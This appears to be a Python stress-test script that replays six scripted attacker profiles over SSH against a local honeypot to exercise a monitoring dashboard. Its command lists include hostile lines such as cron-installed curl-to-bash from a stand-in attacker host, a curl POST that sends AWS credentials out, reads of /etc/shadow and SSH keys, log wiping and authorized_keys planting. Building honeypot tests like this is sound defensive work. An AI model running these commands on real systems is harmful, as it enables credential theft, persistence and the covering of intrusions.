"""Maximum-pressure attacker simulation for end-to-end dashboard testing.

Runs SIX concurrent SSH sessions against the Plenith honeypot, each with
a different attacker profile and pacing.  Spreads commands across a 90-
second window so the operator sees:

  - the engagement list grow + reorder as new sessions appear
  - toast pop-ups + audio chimes as alerts fire
  - the topbar Notify badge climb (critical-unacked count)
  - charts and the heatmap repaint with fresh buckets
  - the command timeline fill in real time

Profiles cover the full alert palette:

  1. jdoe-creds      → AWS keys, SSH key reads, sudoers decoy
  2. agarcia-pivot   → kubectl probes, deploy keys, lateral SSH
  3. mwilson-cleanup → log truncation, cron persistence, history wipe
  4. agarcia-recon   → /etc enumeration, hostnames, /proc snooping
  5. jdoe-exfil      → curl + base64 of sensitive files
  6. mwilson-persist → SSH key planting, .ssh/authorized_keys mods
"""
from __future__ import annotations

import asyncio
import random
import sys
import time

import asyncssh


PROFILES: dict[str, tuple[str, list[str]]] = {
    "jdoe-creds": ("jdoe", [
        "whoami", "id", "groups",
        "sudo -l",
        "cat /etc/sudoers.d/zzz_compat",
        "cat ~/.aws/credentials",
        "cat ~/.aws/config",
        "cat ~/.ssh/id_rsa",
        "cat ~/.ssh/known_hosts",
        "history | head -50",
        "exit",
    ]),
    "agarcia-pivot": ("agarcia", [
        "whoami", "hostname",
        "kubectl get pods --all-namespaces",
        "kubectl get secrets",
        "cat ~/.kube/config",
        "ls -la ~/.docker",
        "cat ~/.docker/config.json",
        "ssh -i ~/.ssh/deploy_key prod-jumphost",
        "ssh root@db-prod-01",
        "ssh admin@api-prod-03",
        "exit",
    ]),
    "mwilson-cleanup": ("mwilson", [
        "whoami",
        "cat /var/log/auth.log",
        "tail -n 200 /var/log/syslog",
        "echo > /var/log/auth.log",
        "rm -f /var/log/secure",
        "crontab -l",
        "echo '* * * * * curl http://attacker.evil/shell.sh | bash' | crontab -",
        "rm ~/.bash_history",
        "ln -sf /dev/null ~/.bash_history",
        "exit",
    ]),
    "agarcia-recon": ("agarcia", [
        "uname -a",
        "cat /etc/os-release",
        "cat /etc/passwd",
        "cat /etc/shadow",
        "cat /etc/hosts",
        "ls -la /proc/1/environ",
        "ps auxf",
        "netstat -tlnp",
        "exit",
    ]),
    "jdoe-exfil": ("jdoe", [
        "find / -name '*.pem' 2>/dev/null",
        "find / -name 'id_rsa*' 2>/dev/null",
        "tar czf /tmp/data.tar.gz /etc/ssl 2>/dev/null",
        "base64 ~/.aws/credentials | head -c 200",
        "curl -X POST -d @~/.aws/credentials http://attacker.evil/exfil",
        "wget http://malware.attacker.evil/payload",
        "exit",
    ]),
    "mwilson-persist": ("mwilson", [
        "mkdir -p ~/.ssh",
        "echo 'ssh-rsa AAAAB3...attackerkey root@evil' >> ~/.ssh/authorized_keys",
        "chmod 600 ~/.ssh/authorized_keys",
        "cat /etc/cron.d/persistence",
        "echo '@reboot root /tmp/.bashrc.sh' > /etc/cron.d/persistence",
        "touch -r /etc/hostname /etc/cron.d/persistence",
        "exit",
    ]),
}


async def run_profile(
    name: str,
    user: str,
    commands: list[str],
    *,
    start_offset: float,
    cmd_delay: float,
    cmd_jitter: float,
) -> tuple[str, int, list[str]]:
    """Run one attacker profile.  Returns (profile_name, cmds_sent, errors)."""
    errors: list[str] = []
    await asyncio.sleep(start_offset)
    print(f"[{name:<18}] connecting (user={user})…", flush=True)
    sent = 0
    try:
        async with asyncssh.connect(
            "127.0.0.1", port=2222,
            username=user, password="any",
            known_hosts=None, client_keys=None,
        ) as conn:
            async with conn.create_process(term_type="xterm",
                                            encoding="utf-8") as proc:
                await asyncio.sleep(0.4)
                for cmd in commands:
                    print(f"[{name:<18}] $ {cmd[:60]}", flush=True)
                    proc.stdin.write(cmd + "\n")
                    try:
                        await proc.stdin.drain()
                    except Exception as e:
                        errors.append(f"drain: {e}")
                        break
                    sent += 1
                    if cmd in ("exit", "logout", "quit"):
                        break
                    # Per-command jitter so the sessions don't all
                    # interleave in lock-step.
                    j = random.uniform(-cmd_jitter, cmd_jitter)
                    await asyncio.sleep(max(0.2, cmd_delay + j))
                try:
                    await asyncio.wait_for(proc.wait(), timeout=8)
                except asyncio.TimeoutError:
                    pass
    except Exception as e:
        errors.append(f"connect/run: {e}")
    print(f"[{name:<18}] done — {sent} cmds, {len(errors)} errors", flush=True)
    return name, sent, errors


async def main() -> None:
    cmd_delay = float(sys.argv[1]) if len(sys.argv) > 1 else 3.5
    cmd_jitter = 0.8

    # Staggered start offsets so the engagements appear in the
    # dashboard one-by-one rather than all in the first tick.
    profiles = list(PROFILES.items())
    random.shuffle(profiles)
    offsets = [i * 4.0 for i in range(len(profiles))]

    print(f"=== Stress test: {len(profiles)} concurrent sessions, "
          f"cmd_delay={cmd_delay}s±{cmd_jitter}, "
          f"stagger={offsets[1] - offsets[0]}s ===", flush=True)
    started = time.time()

    tasks = [
        asyncio.create_task(run_profile(
            name, user, commands,
            start_offset=offset,
            cmd_delay=cmd_delay,
            cmd_jitter=cmd_jitter,
        ))
        for (name, (user, commands)), offset in zip(profiles, offsets)
    ]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    elapsed = time.time() - started
    total_sent = 0
    total_errors = 0
    print("\n=== Summary ===", flush=True)
    for r in results:
        if isinstance(r, Exception):
            print(f"  task failed: {r}", flush=True)
            total_errors += 1
            continue
        name, sent, errs = r
        total_sent += sent
        total_errors += len(errs)
        suffix = f" — errors: {'; '.join(errs)[:80]}" if errs else ""
        print(f"  {name:<18} sent={sent:<3}{suffix}", flush=True)
    print(f"\n  total commands sent: {total_sent}", flush=True)
    print(f"  total errors:        {total_errors}", flush=True)
    print(f"  elapsed:             {elapsed:.1f}s", flush=True)


if __name__ == "__main__":
    asyncio.run(main())
